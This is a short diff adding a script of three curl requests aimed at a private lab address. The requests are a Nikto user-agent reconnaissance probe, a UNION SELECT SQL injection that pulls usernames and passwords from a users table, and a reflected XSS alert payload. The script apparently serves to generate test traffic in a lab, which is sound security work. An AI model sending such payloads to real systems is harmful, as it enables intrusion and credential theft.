@@ -1,0 +1,8 @@
+# 1. Recon - User-Agent Głoso
+curl -s -A "Nikto/2.1.6" http://192.168.122.X/
+
+#2. SQL Injection (SQLi) attack
+curl -s "http://192.168.122.X/?id=-1%27%20UNION%20SELECT%201,username,password%20FROM%20users--"
+
+#3. Cross-Site Scripting (XSS) Attack
+curl -s "http://192.168.122.X/?search=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"
